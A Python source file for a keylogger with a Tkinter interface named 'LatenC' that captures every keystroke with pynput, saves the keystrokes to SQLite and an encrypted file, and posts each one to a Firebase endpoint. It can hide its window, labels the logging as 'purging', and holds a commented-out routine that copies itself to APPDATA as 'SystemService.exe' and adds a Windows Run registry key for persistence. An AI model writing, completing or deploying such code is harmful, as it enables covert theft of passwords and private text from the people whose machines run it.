import tkinter as tk
from pynput import keyboard
from threading import Thread
from crypto_utils import encrypt_log
import os
import sys
import requests
import datetime
import sqlite3
import shutil
import winreg

"""def add_to_startup():
    exe_path = os.path.join(os.getenv('APPDATA'), 'SystemService.exe')
    if not os.path.exists(exe_path):
        try:
            shutil.copy(sys.argv[0], exe_path)
        except Exception as e:
            print(f"[!] Failed to copy to APPDATA: {e}")

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"[!] Failed to add to registry: {e}")

add_to_startup()""" # persistence

log_data = ""

# Save logs to encrypted file
def save_log():
    enc = encrypt_log(log_data)
    os.makedirs("logs", exist_ok=True)
    with open("logs/log.enc", "wb") as f:
        f.write(enc)
    status_label.config(text="Encrypted log saved to logs/log.enc")

def send_log_to_firebase(key_text):
    try:
        payload = {
            "key": key_text,
            "timestamp": str(datetime.datetime.now())
        }
        firebase_url = "https://your-project-id.firebaseio.com/keylogs.json"  # Replace with your real URL
        requests.post(firebase_url, json=payload)
    except Exception as e:
        print(f"[FIREBASE ERROR] {e}")

def log_to_db(text):
    try:
        os.makedirs("logs", exist_ok=True)
        conn = sqlite3.connect("logs/keylog.db")
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                keystroke TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cursor.execute("INSERT INTO logs (keystroke) VALUES (?)", (text,))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"[DB ERROR] {e}")


def on_press(key):
    global log_data
    try:
        char = key.char
    except AttributeError:
        char = f"[{key.name}]"
    except Exception:
        char = "[error]"

    log_data += char
    log_view.delete(1.0, tk.END)
    log_view.insert(tk.END, log_data)

    log_to_db(char)               # Save locally to SQLite
    send_log_to_firebase(char)    # Send to Firebase


def start_logging():
    Thread(target=lambda: keyboard.Listener(on_press=on_press).run(), daemon=True).start()
    start_kill_switch()  # must be called after keylogger thread
    status_label.config(text="Purging started...")


def hide_window():
    window.withdraw()  # hides the GUI
    status_label.config(text="Purge mode: Active")

def start_kill_switch():
    COMBO = {keyboard.Key.ctrl_l, keyboard.Key.shift_l, keyboard.KeyCode.from_char('q')}
    current_keys = set()

    def kill_on_press(key):
        current_keys.add(key)
        if COMBO.issubset(current_keys):
            print("[*] Kill switch triggered.")
            os._exit(0)

    def kill_on_release(key):
        current_keys.discard(key)


    listener = keyboard.Listener(on_press=kill_on_press, on_release=kill_on_release)
    listener.daemon = True
    listener.start()


# --- GUI Setup ---
def run_gui():
    global window, log_view, status_label

    window = tk.Tk()
    window.title("LatenC")
    window.geometry("500x350")

    status_label = tk.Label(window, text="Press 'Start' to begin purging", font=("Arial", 12))
    status_label.pack(pady=5)

    log_view = tk.Text(window, wrap=tk.WORD, height=10, width=60)
    log_view.pack(padx=10, pady=10)

    btn_frame = tk.Frame(window)
    btn_frame.pack(pady=10)

    start_button = tk.Button(btn_frame, text="Start", command=start_logging)
    start_button.grid(row=0, column=0, padx=5)

    save_button = tk.Button(btn_frame, text="Force Start", command=save_log)
    save_button.grid(row=0, column=1, padx=5)

    hide_button = tk.Button(btn_frame, text="Persistent Purging Mode", command=hide_window)
    hide_button.grid(row=0, column=2, padx=5)

    window.mainloop()


if __name__ == "__main__":
    # Uncomment below line if you want to enable persistence again
    # add_to_startup()

    run_gui()

